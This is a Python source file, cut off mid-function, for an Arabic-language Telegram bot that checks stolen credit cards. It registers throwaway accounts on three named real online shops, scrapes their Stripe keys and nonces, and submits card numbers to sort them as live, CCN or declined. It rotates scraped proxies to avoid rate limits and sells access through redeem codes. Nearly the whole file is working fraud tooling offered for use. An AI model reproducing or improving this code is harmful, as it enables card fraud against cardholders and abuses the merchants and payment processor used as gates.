#!/usr/bin/env python3
# ╔═══════════════════════════════════════════╗
# ║       JAMAIKA CHECKER BOT v2.0            ║
# ║       Dev: 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆                   ║
# ║   بانر ثابت + ازرار ديناميكية + Progress  ║
# ╚═══════════════════════════════════════════╝
# ضع ملف baner.webp في نفس مجلد bot.py

import telebot
import requests
import re
import time
import random
import threading
import os
import sys
import sqlite3
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from collections import OrderedDict
import logging

# ═══════════════════════════════════════
# إعدادات التسجيل
# ═══════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════
# قراءة التوكن ومعرف الأدمن
# ═══════════════════════════════════════
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID   = int(os.environ.get('ADMIN_ID', 0))

if not BOT_TOKEN or not ADMIN_ID:
    print("❌ خطأ: BOT_TOKEN أو ADMIN_ID غير مضبوطين في متغيرات البيئة")
    sys.exit(1)

try:
    bot = telebot.TeleBot(BOT_TOKEN)
    print("✅ تم التحقق من التوكن بنجاح")
except Exception as e:
    print(f"❌ خطأ في التوكن: {e}")
    sys.exit(1)

# ═══════════════════════════════════════
# إعدادات البانر
# ═══════════════════════════════════════
BANNER_PATH    = "baner.webp"   # ضع الملف هنا
BANNER_FILE_ID = None            # يُحفظ تلقائياً بعد أول إرسال

# ═══════════════════════════════════════
# قاعدة البيانات
# ═══════════════════════════════════════
# DATA_DIR = مجلد التخزين الدائم (Volume) على الاستضافة.
# على Railway/Render اربط Volume واضبط DATA_DIR=/data
DATA_DIR = os.environ.get('DATA_DIR', os.path.dirname(os.path.abspath(__file__)))
os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH       = os.path.join(DATA_DIR, "bot_database.db")
PROXY_TXT     = os.path.join(DATA_DIR, "working_proxies.txt")

def db():
    """اتصال جديد مع مهلة انتظار للكتابة المتوازية"""
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    return conn

def init_db():
    conn = db()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        subscription_end TEXT,
        credits INTEGER DEFAULT 0,
        used_codes TEXT DEFAULT ""
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY,
        duration_days INTEGER,
        created_by INTEGER,
        used_by INTEGER DEFAULT NULL,
        used_at TEXT DEFAULT NULL,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS proxies (
        proxy TEXT PRIMARY KEY,
        success_count INTEGER DEFAULT 0,
        fail_count INTEGER DEFAULT 0,
        status TEXT DEFAULT "active",
        last_used TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

# ═══════════════════════════════════════
# دوال الاشتراكات
# ═══════════════════════════════════════
def is_subscription_active(user_id):
    if user_id == ADMIN_ID:
        return True
    conn = db()
    c = conn.cursor()
    c.execute("SELECT subscription_end, credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        end_str, credits = row
        if end_str:
            if datetime.fromisoformat(end_str) > datetime.now():
                return True
        if credits and credits > 0:
            return True
    return False

def get_subscription_info(user_id):
    if user_id == ADMIN_ID:
        return "♾️ اشتراك دائم (أدمن)", None
    conn = db()
    c = conn.cursor()
    c.execute("SELECT subscription_end, credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        end_date  = datetime.fromisoformat(row[0])
        remaining = (end_date - datetime.now()).days
        if remaining >= 0:
            return f"✅ نشط | متبقي *{remaining}* يوم", end_date.strftime('%Y-%m-%d')
        else:
            return "❌ منتهي", end_date.strftime('%Y-%m-%d')
    return "❌ لا يوجد اشتراك", None

def redeem_code(user_id, code):
    conn = db()
    c = conn.cursor()
    c.execute("SELECT duration_days, used_by FROM redeem_codes WHERE code = ?", (code,))
    row = c.fetchone()
    if not row or row[1] is not None:
        conn.close()
        return False, "❌ كود غير صالح أو مستخدم من قبل"
    duration_days = row[0]
    now = datetime.now()
    c.execute("SELECT subscription_end FROM users WHERE user_id = ?", (user_id,))
    existing = c.fetchone()
    if existing and existing[0]:
        current_end = datetime.fromisoformat(existing[0])
        new_end = max(current_end, now) + timedelta(days=duration_days)
    else:
        new_end = now + timedelta(days=duration_days)
    c.execute(
        "INSERT OR REPLACE INTO users (user_id, subscription_end) VALUES (?, ?)",
        (user_id, new_end.isoformat())
    )
    c.execute(
        "UPDATE redeem_codes SET used_by = ?, used_at = ? WHERE code = ?",
        (user_id, now.isoformat(), code)
    )
    conn.commit()
    conn.close()
    return True, f"✅ تم تفعيل الاشتراك لمدة *{duration_days}* يوم\n📅 ينتهي: `{new_end.strftime('%Y-%m-%d')}`"

def generate_redeem_code(admin_id, days):
    code = ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ0123456789', k=12))
    conn = db()
    c = conn.cursor()
    c.execute(
        "INSERT INTO redeem_codes (code, duration_days, created_by) VALUES (?, ?, ?)",
        (code, days, admin_id)
    )
    conn.commit()
    conn.close()
    return code

def get_all_codes():
    conn = db()
    c = conn.cursor()
    c.execute(
        "SELECT code, duration_days, used_by, used_at, created_at "
        "FROM redeem_codes ORDER BY created_at DESC"
    )
    rows = c.fetchall()
    conn.close()
    return rows

def get_all_users():
    conn = db()
    c = conn.cursor()
    c.execute(
        "SELECT user_id, subscription_end, credits FROM users ORDER BY user_id"
    )
    rows = c.fetchall()
    conn.close()
    return rows

def revoke_code(code):
    conn = db()
    c = conn.cursor()
    c.execute(
        "DELETE FROM redeem_codes WHERE code = ? AND used_by IS NULL", (code,)
    )
    deleted = c.rowcount
    conn.commit()
    conn.close()
    return deleted > 0

# ═══════════════════════════════════════
# دوال البروكسيات
# ═══════════════════════════════════════
def add_proxy_to_db(proxy):
    conn = db()
    c = conn.cursor()
    try:
        c.execute("INSERT INTO proxies (proxy) VALUES (?)", (proxy,))
        conn.commit()
    except:
        pass
    conn.close()

def get_all_proxies():
    conn = db()
    c = conn.cursor()
    c.execute(
        "SELECT proxy, success_count, fail_count, status "
        "FROM proxies WHERE status = 'active'"
    )
    rows = c.fetchall()
    conn.close()
    return rows

def update_proxy_success(proxy):
    conn = db()
    c = conn.cursor()
    c.execute(
        "UPDATE proxies SET success_count = success_count + 1, status = 'active' "
        "WHERE proxy = ?", (proxy,)
    )
    conn.commit()
    conn.close()

def update_proxy_failure(proxy):
    conn = db()
    c = conn.cursor()
    c.execute(
        "UPDATE proxies SET fail_count = fail_count + 1 WHERE proxy = ?", (proxy,)
    )
    c.execute(
        "UPDATE proxies SET status = 'dead' "
        "WHERE proxy = ? AND fail_count >= 3", (proxy,)
    )
    conn.commit()
    conn.close()

# ═══════════════════════════════════════
# ProxyPool المتقدم
# ═══════════════════════════════════════
class ProxyPool:
    def __init__(self, max_retries=2, backoff_factor=1, rate_limit=10, rate_period=60):
        self.proxies       = OrderedDict()
        self.lock          = threading.Lock()
        self.max_retries   = max_retries
        self.backoff_factor = backoff_factor
        self.rate_limit    = rate_limit
        self.rate_period   = rate_period
        self.load_from_db()

    def load_from_db(self):
        for proxy, success, fail, status in get_all_proxies():
            self.proxies[proxy] = {
                'success': success, 'failure': fail,
                'last_used': 0, 'status': status,
                'request_timestamps': []
            }
        logger.info(f"📁 تم تحميل {len(self.proxies)} بروكسي")

    def add_proxy(self, proxy):
        with self.lock:
            if proxy not in self.proxies:
                self.proxies[proxy] = {
                    'success': 0, 'failure': 0,
                    'last_used': 0, 'status': 'active',
                    'request_timestamps': []
                }
                add_proxy_to_db(proxy)

    def _clean_ts(self, stats):
        now = time.time()
        stats['request_timestamps'] = [
            ts for ts in stats['request_timestamps']
            if now - ts < self.rate_period
        ]

    def _is_rate_limited(self, stats):
        self._clean_ts(stats)
        return len(stats['request_timestamps']) >= self.rate_limit

    def get_proxy(self):
        with self.lock:
            active = [(p, s) for p, s in self.proxies.items() if s['status'] == 'active']
            if not active:
                return None
            def score(s):
                t = s['success'] + s['failure']
                return s['success'] / t if t else 1.0
            best = max(active, key=lambda x: score(x[1]))
            proxy = best[0]
            if self._is_rate_limited(self.proxies[proxy]):
                for p, s in active:
                    if p != proxy and not self._is_rate_limited(s):
                        proxy = p
                        break
            self.proxies[proxy]['last_used'] = time.time()
            self.proxies[proxy]['request_timestamps'].append(time.time())
            return proxy

    def report_success(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies[proxy]['success'] += 1
                self.proxies[proxy]['status'] = 'active'
                update_proxy_success(proxy)

    def report_failure(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies[proxy]['failure'] += 1
                fc = self.proxies[proxy]['failure']
                if fc >= 3:
                    self.proxies[proxy]['status'] = 'dead'
                elif fc >= 2:
                    self.proxies[proxy]['status'] = 'banned'
                update_proxy_failure(proxy)

    def get_stats(self):
        with self.lock:
            a = sum(1 for s in self.proxies.values() if s['status'] == 'active')
            b = sum(1 for s in self.proxies.values() if s['status'] == 'banned')
            d = sum(1 for s in self.proxies.values() if s['status'] == 'dead')
            return a, b, d

proxy_pool = ProxyPool()

# ═══════════════════════════════════════
# سحب بروكسيات GitHub
# ═══════════════════════════════════════
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Mohammedcha/ProxRipper/main/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
]

def fetch_proxies_from_github():
    all_proxies = []
    for url in PROXY_SOURCES:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                for p in resp.text.strip().splitlines():
                    p = p.strip()
                    if p and not p.startswith('#') and ':' in p:
                        p = p.split()[0] if ' ' in p else p
                        all_proxies.append(p)
        except:
            pass
    return list(set(all_proxies))

def check_proxy_accurate(proxy):
    proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=8)
        if r.status_code == 200 and r.json().get('origin'):
            return proxy
    except:
        pass
    try:
        time.sleep(0.5)
        r = requests.get("https://httpbin.org/ip", proxies=proxy_dict, timeout=5)
        if r.status_code == 200:
            return proxy
    except:
        pass
    return None

def add_proxies_to_pool(proxy_list):
    working = []
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(check_proxy_accurate, p): p for p in proxy_list}
        for future in as_completed(futures):
            res = future.result()
            if res:
                working.append(res)
                proxy_pool.add_proxy(res)
    with open(PROXY_TXT, "w") as f:
        f.write("\n".join(working))
    return working

# ═══════════════════════════════════════
# محلل الكروت الشامل — يقبل أى شكل فواصل
# ═══════════════════════════════════════
# يقبل:  | / : ; , - _ مسافات تاب  وأى خلط بينها
# ويقبل أيضاً:  4111111111111111 12 2025 123
#              4111-1111-1111-1111|12/25|123
#              4111111111111111:12:25:123
#              MM/YY مدمجة:  4111111111111111 | 12/25 | 123
# ويتجاهل أى نص زائد حول الكارت (مثل "CC: ... | Exp: ...")

def normalize_card(raw):
    """
    يحول أى صيغة كارت إلى 'cc|mm|yyyy|cvv'.
    يرجع None لو مش كارت صالح.
    """
    if not raw:
        return None
    s = str(raw).strip()
    if not s:
        return None

    # وحد الأرقام العربية/الهندية إلى لاتينية
    trans = {}
    for base in (0x0660, 0x06F0):  # عربية-هندية + فارسية
        for d in range(10):
            trans[base + d] = ord('0') + d
    s = s.translate(trans)

    # لو فيه رقم كارت طويل مقسم بشرطات/مسافات، لمّه أولاً
    # نجمع كل الأرقام المتتالية مع الفواصل المسموحة
    tokens = re.findall(r'\d+', s)
    if len(tokens) < 3:
        return None

    # ابنِ سلسلة الأرقام كلها لنحدد رقم البطاقة (13-19 خانة)
    # نجرب كل النوافذ المتصلة من التوكنات ونختار أول رقم يجتاز Luhn
    cc = None
    idx_after = 0

    for start in range(len(tokens) - 1):
        joined = ''
        for end in range(start, len(tokens)):
            joined += tokens[end]
            if len(joined) > 19:
                break
            remaining = len(tokens) - (end + 1)
            if 13 <= len(joined) <= 19 and remaining >= 2 and luhn_valid(joined):
                cc, idx_after = joined, end + 1
                break
        if cc:
            break

    if cc is None:
        return None

    rest = tokens[idx_after:]
    if len(rest) < 2:
        return None

    # ─ استخراج الشهر / السنة / cvv ─
    month = year = cvv = None

    if len(rest) >= 3:
        month, year, cvv = rest[0], rest[1], rest[2]
    else:
        # حالتان: MMYY مدمجة + cvv   أو   MM + YYcvv (غير شائعة)
        a, b = rest[0], rest[1]
        if len(a) == 4:                 # MMYY
            month, year = a[:2], a[2:]
            cvv = b
        elif len(a) == 6:               # MMYYYY
            month, year = a[:2], a[2:]
            cvv = b
        else:
            return None

    # نظّف الشهر
    if len(month) == 1:
        month = '0' + month
    if len(month) != 2 or not (1 <= int(month) <= 12):
        return None

    # نظّف السنة
    if len(year) == 2:
        year = '20' + year
    elif len(year) == 4:
        pass
    else:
        return None
    if not (2000 <= int(year) <= 2099):
        return None

    # نظّف الـ cvv
    if len(cvv) not in (3, 4):
        return None

    return f"{cc}|{month}|{year}|{cvv}"


def luhn_valid(number):
    """تحقق خوارزمية Luhn — يمنع إرسال أرقام مستحيلة إلى البوابة"""
    total, alt = 0, False
    for ch in reversed(number):
        d = ord(ch) - 48
        if alt:
            d *= 2
            if d > 9:
                d -= 9
        total += d
        alt = not alt
    return total % 10 == 0


def extract_cards(text):
    """يستخرج كل الكروت الصالحة من نص متعدد الأسطر (يتجاهل التكرار)"""
    found, seen = [], set()
    for line in str(text).splitlines():
        line = line.strip()
        if not line:
            continue
        card = normalize_card(line)
        if card and card not in seen:
            seen.add(card)
            found.append(card)
    return found


# ═══════════════════════════════════════
# فحص البطاقات
# ═══════════════════════════════════════
def check_card_on_site(card_str, site_url, proxy=None):
    parts = card_str.split('|')
    if len(parts) != 4:
        return "INVALID_FORMAT", ""
    cc, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year

    proxy_dict = (
        {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    )
    session = requests.Session()
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        resp    = session.get(f"{site_url}/my-account/", headers=headers,
                              proxies=proxy_dict, timeout=25)
        html = resp.text
        m = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
        if not m:
            return "GATE_DOWN", "تعذر قراءة نموذج التسجيل (البوابة تغيرت أو محجوبة)"
        reg_nonce = m.group(1)

        email = f"{random.randint(100000,999999)}@temp.com"
        session.post(f"{site_url}/my-account/", proxies=proxy_dict, timeout=25, data={
            'email': email, 'password': 'Pass123!',
            'woocommerce-register-nonce': reg_nonce,
            'register': 'Register', '_wp_http_referer': '/my-account/'
        }, headers=headers)

        resp = session.get(f"{site_url}/my-account/add-payment-method/",
                           headers=headers, proxies=proxy_dict, timeout=25)
        html = resp.text
        pk_m     = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        nonce_m  = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        if not pk_m or not nonce_m:
            return "GATE_DOWN", "تعذر استخراج مفاتيح Stripe (فشل التسجيل أو البوابة تغيرت)"

        stripe_data = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': month, 'card[exp_year]': year[-2:],
            'key': pk_m.group(0), '_stripe_version': '2024-06-20'
        }
        resp   = session.post("https://api.stripe.com/v1/payment_methods",
                              data=stripe_data,
                              headers={'Content-Type': 'application/x-www-form-urlencoded',
                                       'Origin': 'https://js.stripe.com'},
                              proxies=proxy_dict, timeout=25)
        pm_json = resp.json()
        pm_id   = pm_json.get('id')
        if not pm_id:
            # Stripe رفض إنشاء وسيلة الدفع — ارجع السبب الحقيقى
            err  = pm_json.get('error', {}) or {}
            code = err.get('code', '') or err.get('decline_code', '')
            reason = err.get('message', 'رفض من Stripe')
            if code in ('incorrect_number', 'invalid_number'):
                return "INVALID_CARD", reason
            if code in ('invalid_expiry_month', 'invalid_expiry_year', 'expired_card'):
                return "INVALID_CARD", reason
            if code == 'invalid_cvc':
                return "INVALID_CARD", reason
            if err.get('type') == 'api_error' or resp.status_code >= 500:
                return "GATE_DOWN", reason
            return "DECLINED", reason

        resp   = session.post(
            f"{site_url}/wp-admin/admin-ajax.php",
            data={
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce_m.group(1)
            },
            headers={'X-Requested-With': 'XMLHttpRequest'},
            proxies=proxy_dict, timeout=25
        )
        try:
            result = resp.json()
        except Exception:
            return "GATE_DOWN", f"رد غير متوقع من البوابة (HTTP {resp.status_code})"

        if result.get('success'):
            data = result.get('data', {}) or {}
            st   = str(data.get('status', '')).lower()
            # 3DS / OTP قد يظهر داخل نجاح مع status=requires_action
            if 'requires_action' in st or 'requires_confirmation' in st:
                return "OTP", "يتطلب تحقق 3D Secure"
            return "PASSED", "تمت إضافة البطاقة بنجاح"

        err_obj = (result.get('data', {}) or {}).get('error', {}) or {}
        err_msg = err_obj.get('message', '') or str(result.get('data', ''))
        low     = err_msg.lower()
        d_code  = (err_obj.get('decline_code', '') or err_obj.get('code', '')).lower()

        # ─ 3D Secure / OTP ─
        if any(k in low for k in ('3d', 'three_d', 'authenticate', 'authentication',
                                  'otp', 'requires_action', 'verify')) \
           or 'authentication_required' in d_code:
            return "OTP", err_msg or "يتطلب تحقق 3D Secure"

        # ─ CVV صح لكن رصيد غير كافى = البطاقة حية ─
        if d_code in ('insufficient_funds',) or 'insufficient funds' in low:
            return "LIVE", err_msg or "رصيد غير كافى (البطاقة حية)"

        # ─ CVV خطأ فقط = البطاقة موجودة ─
        if d_code in ('incorrect_cvc', 'invalid_cvc') or 'security code' in low:
            return "CCN", err_msg or "رقم البطاقة صحيح لكن CVV خطأ"

        # ─ مشاكل بوابة لا علاقة لها بالبطاقة ─
        if any(k in low for k in ('nonce', 'rate limit', 'too many',
                                  'try again later', 'api_error', 'timeout')):
            return "GATE_DOWN", err_msg or "مشكلة مؤقتة فى البوابة"

        return "DECLINED", err_msg or "مرفوضة"
    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", "فشل البروكسي"
    except requests.exceptions.SSLError:
        return "PROXY_ERROR", "خطأ SSL عبر البروكسي"
    except requests.exceptions.ConnectTimeout:
        return "PROXY_ERROR", "انتهت مهلة الاتصال"
    except requests.exceptions.ReadTimeout:
        return "GATE_DOWN", "انتهت مهلة قراءة رد البوابة"
    except requests.exceptions.ConnectionError as e:
        return "PROXY_ERROR", f"فشل الشبكة: {str(e)[:60]}"
    except Exception as e:
        return "ERROR", f"{type(e).__name__}: {str(e)[:60]}"


# الحالات التى تعنى أن الفحص نفسه فشل (مش البطاقة مرفوضة)
INFRA_FAIL = ("GATE_DOWN", "PROXY_ERROR", "ERROR")
# الحالات النهائية التى لا نعيد المحاولة فيها
FINAL_OK   = ("PASSED", "OTP", "LIVE", "CCN", "DECLINED", "INVALID_CARD")


def check_card_with_retry(card_str, site_url):
    """
    يحاول عبر بروكسي ثم يعيد المحاولة، وأخيراً يحاول بدون بروكسي.
    لا يحول فشل الشبكة/البوابة إلى DECLINED كاذب.
    """
    last_status, last_reason = "ERROR", "لم تكتمل أى محاولة"

    attempts = []
    for _ in range(max(1, proxy_pool.max_retries)):
        attempts.append(True)      # محاولة عبر بروكسي
    attempts.append(False)         # محاولة أخيرة بدون بروكسي (مباشر)

    for i, use_proxy in enumerate(attempts):
        proxy = proxy_pool.get_proxy() if use_proxy else None
        status, reason = check_card_on_site(card_str, site_url, proxy)
        last_status, last_reason = status, reason

        if status in FINAL_OK:
            if proxy:
                proxy_pool.report_success(proxy)
            return status, reason

        # فشل بنية تحتية → عاقب البروكسي وأعد المحاولة
        if proxy:
            proxy_pool.report_failure(proxy)
        if i < len(attempts) - 1:
            time.sleep(proxy_pool.backoff_factor * (2 ** min(i, 3)))

    return last_status, last_reason


# ═══════════════════════════════════════
# بوابات الفحص
# ═══════════════════════════════════════
GATES = {
    '1': {'name': '🏦 بوابة 1', 'site': 'https://copenhagensilver.com'},
    '2': {'name': '💳 بوابة 2', 'site': 'https://www.spokaneshirtco.com'},
    '3': {'name': '🔥 بوابة 3', 'site': 'https://www.4allpromos.com'}
}

def get_bin_info(bin6):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                "brand":   d.get("scheme", "?").upper(),
                "type":    d.get("type",   "?").capitalize(),
                "bank":    d.get("bank",   {}).get("name", "?"),
                "country": d.get("country",{}).get("name", "?"),
                "flag":    d.get("country",{}).get("emoji","🌍")
            }
    except:
        pass
    return {"brand":"?","type":"?","bank":"?","country":"?","flag":"🌍"}

# ═══════════════════════════════════════
# الحالة العامة
# ═══════════════════════════════════════
user_main_message  = {}   # {user_id: message_id}  - رسالة البانر الثابتة
user_gate_choice   = {}   # {user_id: gate_id}
user_session_state = {}   # {user_id: state_str}
admin_session      = {}   # {user_id: admin_state}

# ═══════════════════════════════════════
# نص القائمة الرئيسية
# ═══════════════════════════════════════
MAIN_CAPTION = (
    "🌟 *JAMAIKA CHECKER* 🌟\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "أقوى بوت لفحص البطاقات البنكية\n\n"
    "اختر ما تريد من القائمة 👇"
)

CARD_FORMAT_HELP = (
    "❌ *لم يتم التعرف على أى كارت صالح!*\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "البوت يقبل *أى فاصل* بين الأرقام:\n"
    "`4111111111111111|12|2025|123`\n"
    "`4111111111111111:12:25:123`\n"
    "`4111111111111111 12 25 123`\n"
    "`4111-1111-1111-1111/12/25/123`\n"
    "`4111111111111111,12/25,123`\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "⚠️ تأكد أن رقم البطاقة صحيح (يجتاز Luhn)\n"
    "والشهر 1-12 والسنة 2000-2099 والـ CVV 3 أو 4 أرقام."
)

# ═══════════════════════════════════════
# بناء الكيبوردات — ألوان حقيقية (Bot API 9.4)
# ═══════════════════════════════════════
# Telegram أضاف خاصية style للأزرار فى Bot API 9.4 (9 فبراير 2026).
# الألوان المتاحة 3 فقط:  primary أزرق | success أخضر | danger أحمر
# الدعم فى pyTelegramBotAPI بدأ من الإصدار 4.31.0
STYLE_PRIMARY = "primary"   # 🔵 أزرق — الإجراءات الرئيسية
STYLE_SUCCESS = "success"   # 🟢 أخضر — الإجراءات الإيجابية
STYLE_DANGER  = "danger"    # 🔴 أحمر — الإجراءات الحساسة/الرجوع

# تحقق دقيق من دعم style: هل المكتبة تقبل الوسيط *وتُدرجه في to_dict*؟
STYLE_SUPPORTED = False
try:
    # إنشاء زر تجريبي مع style
    _probe = types.InlineKeyboardButton("t", callback_data="t", style=STYLE_PRIMARY)
    # التحقق من أن style ظهر في التمثيل المسلسل (الضمان الوحيد للفعالية)
    if hasattr(_probe, 'to_dict'):
        d = _probe.to_dict()
        if isinstance(d, dict) and d.get('style') == STYLE_PRIMARY:
            STYLE_SUPPORTED = True
except Exception:
    pass

if not STYLE_SUPPORTED:
    logger.warning(
        "⚠️ إصدار pyTelegramBotAPI لا يدعم ألوان الأزرار (style). "
        "لتفعيل الألوان: حدّث المكتبة بأمر:\n"
        "   pip install -U 'pyTelegramBotAPI>=4.31.0'"
    )

def btn(text, style=None, **kwargs):
    """زر إنلاين مع لون — يمرر style فقط إذا كان مدعومًا فعليًا"""
    if style and STYLE_SUPPORTED:
        return types.InlineKeyboardButton(text, style=style, **kwargs)
    # إزالة style من kwargs تجنبًا لأي استثناء في المكتبات القديمة
    kwargs.pop('style', None)
    return types.InlineKeyboardButton(text, **kwargs)

def main_menu_kb():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        btn("💳 فحص كارت",   STYLE_SUCCESS, callback_data="menu_single"),
        btn("📋 فحص مجموعة", STYLE_PRIMARY, callback_data="menu_bulk"),
    )
    kb.add(
        btn("👤 حسابى",      STYLE_PRIMARY, callback_data="menu_account"),
        btn("🎫 كود تفعيل",  STYLE_SUCCESS, callback_data="menu_redeem"),
    )
    kb.add(
        btn("🆘 الدعم", STYLE_PRIMARY, url="https://t.me/BaBa_MeDia_0"),
    )
    return kb

def back_kb():
    kb = types.InlineKeyboardMarkup()
    kb.add(btn("🏠 القائمة الرئيسية", STYLE_DANGER, callback_data="main_menu"))
    return kb

def gates_kb(mode):
    kb = types.InlineKeyboardMarkup(row_width=1)
    for gid, info in GATES.items():
        kb.add(btn(info['name'], STYLE_PRIMARY, callback_data=f"gate_{gid}_{mode}"))
    kb.add(btn("🏠 القائمة الرئيسية", STYLE_DANGER, callback_data="main_menu"))
    return kb

def after_check_kb(mode):
    kb = types.InlineKeyboardMarkup(row_width=1)
    label = "🔄 فحص كارت آخر" if mode == 'single' else "🔄 فحص مجموعة أخرى"
    cb    = "menu_single"       if mode == 'single' else "menu_bulk"
    kb.add(btn(label, STYLE_SUCCESS, callback_data=cb))
    kb.add(btn("🏠 القائمة الرئيسية", STYLE_DANGER, callback_data="main_menu"))
    return kb

# ═══════════════════════════════════════
# إرسال / تحديث رسالة البانر
# ═══════════════════════════════════════
def send_banner(chat_id, user_id, caption, markup):
    """إرسال رسالة البانر جديدة وحفظ معرفها"""
    global BANNER_FILE_ID

    # احذف الرسالة القديمة إن وُجدت
    old_id = user_main_message.get(user_id)
    if old_id:
        try:
            bot.delete_message(chat_id, old_id)
        except:
            pass

    photo = None
    if BANNER_FILE_ID:
        photo = BANNER_FILE_ID
    elif os.path.exists(BANNER_PATH):
        photo = open(BANNER_PATH, 'rb')

    try:
        if photo:
            msg = bot.send_photo(chat_id, photo, caption=caption,
                                 reply_markup=markup, parse_mode="Markdown")
            if not BANNER_FILE_ID:
                BANNER_FILE_ID = msg.photo[-1].file_id
            if hasattr(photo, 'close'):
                photo.close()
        else:
            msg = bot.send_message(chat_id, caption,
                                   reply_markup=markup, parse_mode="Markdown")
        user_main_message[user_id] = msg.message_id
        return msg.message_id
    except Exception as e:
        logger.error(f"send_banner error: {e}")
        return None

def edit_banner(user_id, chat_id, caption, markup, msg_id=None):
    """تحديث رسالة البانر الموجودة (الكابشن والأزرار فقط)"""
    mid = msg_id or user_main_message.get(user_id)
    if not mid:
        return send_banner(chat_id, user_id, caption, markup)
    try:
        bot.edit_message_caption(
            caption=caption, chat_id=chat_id, message_id=mid,
            reply_markup=markup, parse_mode="Markdown"
        )
        user_main_message[user_id] = mid
        return mid
    except Exception as e:
        logger.warning(f"edit_banner fallback – sending new: {e}")
        return send_banner(chat_id, user_id, caption, markup)

# ═══════════════════════════════════════
# شريط التقدم
# ═══════════════════════════════════════
STATUS_LABEL = {
    "PASSED":       ("✅", "PASSED — تمت الإضافة"),
    "OTP":          ("⚠️", "OTP / 3D SECURE"),
    "LIVE":         ("💚", "LIVE — رصيد غير كافى"),
    "CCN":          ("🟡", "CCN — الرقم صحيح CVV خطأ"),
    "DECLINED":     ("❌", "DECLINED"),
    "INVALID_CARD": ("🚫", "بيانات البطاقة غير صحيحة"),
    "GATE_DOWN":    ("🛠️", "البوابة لا تستجيب — لم يتم الفحص"),
    "PROXY_ERROR":  ("📡", "فشل البروكسي — لم يتم الفحص"),
    "ERROR":        ("⁉️", "خطأ غير متوقع — لم يتم الفحص"),
    "INVALID_FORMAT": ("🚫", "صيغة غير صحيحة"),
}

def md_escape(t):
    """تهريب رموز Markdown حتى لا تفسد رسالة تيليجرام"""
    for ch in ('_', '*', '`', '['):
        t = str(t).replace(ch, '\\' + ch)
    return t

def progress_bar(current, total, length=14):
    if total == 0:
        return "░" * length + "  0%"
    filled = int(length * current / total)
    pct    = int(100 * current / total)
    return "█" * filled + "░" * (length - filled) + f"  {pct}%"

# ═══════════════════════════════════════
# /start
# ═══════════════════════════════════════
@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    user_session_state.pop(user_id, None)
    
    # Ensure user exists in database
    conn = db()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

    # تجديد الرسالة الموجودة بدل إرسال رسالة جديدة في كل /start
    mid = user_main_message.get(user_id)
    if mid:
        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(), msg_id=mid)
    else:
        send_banner(chat_id, user_id, MAIN_CAPTION, main_menu_kb())

# ═══════════════════════════════════════
# /addproxy ip:port [ip:port ...] — أدمن فقط
# المستخدم يبعت /addproxy 1.2.3.4:8080 5.6.7.8:3128
# ═══════════════════════════════════════
@bot.message_handler(commands=['addproxy'])
def cmd_addproxy(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    args = message.text.split()[1:]
    if not args:
        bot.send_message(message.chat.id,
            "📡 *إضافة بروكسي يدوي*\n\n"
            "أرسل البروكسيات هكذا:\n"
            "`/addproxy 1.2.3.4:8080`\n"
            "`/addproxy 1.2.3.4:8080 5.6.7.8:3128`\n\n"
